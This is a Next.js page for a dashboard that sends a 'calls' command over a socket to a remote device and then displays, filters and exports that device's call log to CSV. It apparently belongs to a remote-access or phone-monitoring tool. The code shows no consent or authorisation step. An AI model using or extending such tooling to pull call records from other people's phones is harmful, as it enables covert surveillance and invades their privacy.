'use client';

import { useState, useEffect, useMemo } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { useNotification } from '@/context/NotificationProvider';
import { initSocket, sendCommand, onResult, COMMANDS, disconnectSocket, SocketResult } from '@/lib/socket';
import { formatDuration, exportToCSV, getCallTypeInfo } from '@/lib/utils';
import {
    Phone, PhoneIncoming, PhoneOutgoing, PhoneMissed,
    ArrowLeft, Download, RefreshCw, Search, X
} from 'lucide-react';

interface Call {
    id: string;
    phoneNo: string;
    name: string;
    duration: number;
    type: number;
}

export default function CallsPage() {
    const searchParams = useSearchParams();
    const router = useRouter();
    const { showSuccess, showError, showTimeout, showConnection } = useNotification();

    const deviceName = searchParams.get('name') || 'Device';
    const deviceId = searchParams.get('deviceId') || '';

    const [calls, setCalls] = useState<Call[]>([]);
    const [isLoading, setIsLoading] = useState(false);
    const [searchQuery, setSearchQuery] = useState('');
    const [selectedFilter, setSelectedFilter] = useState<'all' | 'incoming' | 'outgoing' | 'missed'>('all');

    useEffect(() => {
        initSocket(deviceId);
        showConnection(true, 'Connected to device');

        onResult((data: SocketResult) => {
            let callsArray = null;

            if (data.callsList) {
                if (Array.isArray(data.callsList)) {
                    callsArray = data.callsList;
                } else if ((data.callsList as any).callsList) {
                    callsArray = (data.callsList as any).callsList;
                }
            }

            if (callsArray && Array.isArray(callsArray)) {
                const processed = callsArray.map((call, idx) => ({
                    id: `${idx}-${call.phoneNo}-${Date.now()}`,
                    phoneNo: String(call.phoneNo || 'Unknown'),
                    name: String(call.name || 'Unknown'),
                    duration: Number(call.duration) || 0,
                    type: Number(call.type) || 2,
                }));
                setCalls(processed);
                setIsLoading(false);
                showSuccess('Call Logs Updated', `Loaded ${processed.length} calls`);
            }
        });

        return () => disconnectSocket();
    }, [deviceId]);

    const handleRefresh = () => {
        setIsLoading(true);
        setSearchQuery('');
        sendCommand({
            userId: deviceId,
            command: { order: COMMANDS.CALLS },
        });

        setTimeout(() => {
            if (isLoading) {
                setIsLoading(false);
                showTimeout('Request Timeout', 'Server took too long to respond', handleRefresh);
            }
        }, 60000);
    };

    const handleExport = () => {
        if (calls.length === 0) {
            showError('No Data', 'No calls to export');
            return;
        }

        exportToCSV(
            calls.map(c => ({
                ...c,
                typeLabel: getCallTypeInfo(c.type).label,
            })),
            ['Name', 'Phone Number', 'Duration (seconds)', 'Call Type'],
            ['name', 'phoneNo', 'duration', 'typeLabel'],
            `CallLogs_${new Date().toISOString().split('T')[0]}.csv`
        );
        showSuccess('Exported', 'Call logs saved as CSV');
    };

    const filteredCalls = useMemo(() => {
        let result = calls;

        if (selectedFilter !== 'all') {
            const typeMap = { incoming: 1, outgoing: 2, missed: 3 };
            result = result.filter(c => c.type === typeMap[selectedFilter]);
        }

        if (searchQuery) {
            const q = searchQuery.toLowerCase();
            result = result.filter(c =>
                c.name.toLowerCase().includes(q) || c.phoneNo.includes(q)
            );
        }

        return result;
    }, [calls, selectedFilter, searchQuery]);

    const stats = useMemo(() => ({
        all: calls.length,
        incoming: calls.filter(c => c.type === 1).length,
        outgoing: calls.filter(c => c.type === 2).length,
        missed: calls.filter(c => c.type === 3).length,
    }), [calls]);

    const filters = [
        { id: 'all', label: 'All', icon: Phone, count: stats.all, colors: ['#8b5cf6', '#7c3aed'] },
        { id: 'incoming', label: 'Incoming', icon: PhoneIncoming, count: stats.incoming, colors: ['#10b981', '#059669'] },
        { id: 'outgoing', label: 'Outgoing', icon: PhoneOutgoing, count: stats.outgoing, colors: ['#3b82f6', '#2563eb'] },
        { id: 'missed', label: 'Missed', icon: PhoneMissed, count: stats.missed, colors: ['#ef4444', '#dc2626'] },
    ] as const;

    return (
        <div className="max-w-4xl mx-auto">
            {/* Header */}
            <div className="gradient-border mb-6">
                <div className="bg-[#1a0b2e] rounded-[1.15rem] p-6">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-4">
                            <button onClick={() => router.back()} className="p-2 rounded-xl bg-purple-500/15">
                                <ArrowLeft className="w-5 h-5 text-purple-400" />
                            </button>
                            <div>
                                <h1 className="text-2xl font-bold text-white">Call Logs</h1>
                                <p className="text-gray-400">{deviceName}</p>
                            </div>
                        </div>
                        <button onClick={handleExport} className="p-3 rounded-full bg-white/10">
                            <Download className="w-5 h-5 text-white" />
                        </button>
                    </div>
                </div>
            </div>

            {/* Filter Cards */}
            <div className="flex gap-3 overflow-x-auto pb-2 mb-4">
                {filters.map((filter) => {
                    const Icon = filter.icon;
                    const isActive = selectedFilter === filter.id;

                    return (
                        <button
                            key={filter.id}
                            onClick={() => setSelectedFilter(filter.id)}
                            className={`flex-shrink-0 w-24 rounded-2xl p-0.5 transition-all ${isActive ? 'opacity-100 scale-100' : 'opacity-60 scale-95'
                                }`}
                            style={{ background: `linear-gradient(135deg, ${filter.colors[0]}, ${filter.colors[1]})` }}
                        >
                            <div className="bg-[#1a0b2e] rounded-[0.875rem] p-3 text-center">
                                <Icon className="w-5 h-5 text-white mx-auto mb-2" />
                                <p className="text-xl font-bold text-white">{filter.count}</p>
                                <p className="text-xs text-gray-400">{filter.label}</p>
                            </div>
                        </button>
                    );
                })}
            </div>

            {/* Search */}
            {calls.length > 0 && (
                <div className="ms-card flex items-center gap-3 px-4 py-3 mb-4">
                    <Search className="w-5 h-5 text-gray-500" />
                    <input
                        type="text"
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                        placeholder="Search calls..."
                        className="flex-1 bg-transparent text-white outline-none"
                    />
                    {searchQuery && (
                        <button onClick={() => setSearchQuery('')}>
                            <X className="w-5 h-5 text-gray-500" />
                        </button>
                    )}
                </div>
            )}

            {/* Refresh Button */}
            <button
                onClick={handleRefresh}
                disabled={isLoading}
                className={`w-full py-4 rounded-xl font-semibold flex items-center justify-center gap-3 mb-6 ${isLoading
                        ? 'bg-gray-600 text-gray-300'
                        : 'gradient-primary text-white'
                    }`}
            >
                <RefreshCw className={`w-5 h-5 ${isLoading ? 'animate-spin' : ''}`} />
                {isLoading ? 'Loading...' : 'Refresh Call Logs'}
            </button>

            {/* Call List */}
            {filteredCalls.length === 0 ? (
                <div className="text-center py-16">
                    <Phone className="w-12 h-12 text-gray-600 mx-auto mb-3" />
                    <p className="text-white font-semibold mb-1">No calls available</p>
                    <p className="text-gray-400 text-sm">Tap refresh to load call logs</p>
                </div>
            ) : (
                <div className="space-y-3">
                    {filteredCalls.map((call) => {
                        const typeInfo = getCallTypeInfo(call.type);
                        return (
                            <div key={call.id} className="ms-card p-4 flex items-center gap-4">
                                <div
                                    className="w-12 h-12 rounded-full flex items-center justify-center"
                                    style={{ background: `linear-gradient(135deg, ${typeInfo.colors[0]}, ${typeInfo.colors[1]})` }}
                                >
                                    {call.type === 1 && <PhoneIncoming className="w-5 h-5 text-white" />}
                                    {call.type === 2 && <PhoneOutgoing className="w-5 h-5 text-white" />}
                                    {call.type === 3 && <PhoneMissed className="w-5 h-5 text-white" />}
                                </div>
                                <div className="flex-1 min-w-0">
                                    <div className="flex items-center justify-between mb-1">
                                        <p className="font-semibold text-white truncate">{call.name}</p>
                                        <span className="text-purple-400 font-semibold text-sm">{formatDuration(call.duration)}</span>
                                    </div>
                                    <div className="flex items-center gap-1.5 text-gray-400 text-sm mb-2">
                                        <Phone className="w-3 h-3" />
                                        <span className="truncate">{call.phoneNo}</span>
                                    </div>
                                    <span
                                        className="text-xs font-semibold px-3 py-1 rounded-full"
                                        style={{
                                            backgroundColor: `${typeInfo.colors[0]}20`,
                                            color: typeInfo.colors[0]
                                        }}
                                    >
                                        {typeInfo.label}
                                    </span>
                                </div>
                            </div>
                        );
                    })}
                    <p className="text-center text-gray-400 text-sm py-4">
                        Showing {filteredCalls.length} of {calls.length} calls
                    </p>
                </div>
            )}
        </div>
    );
}
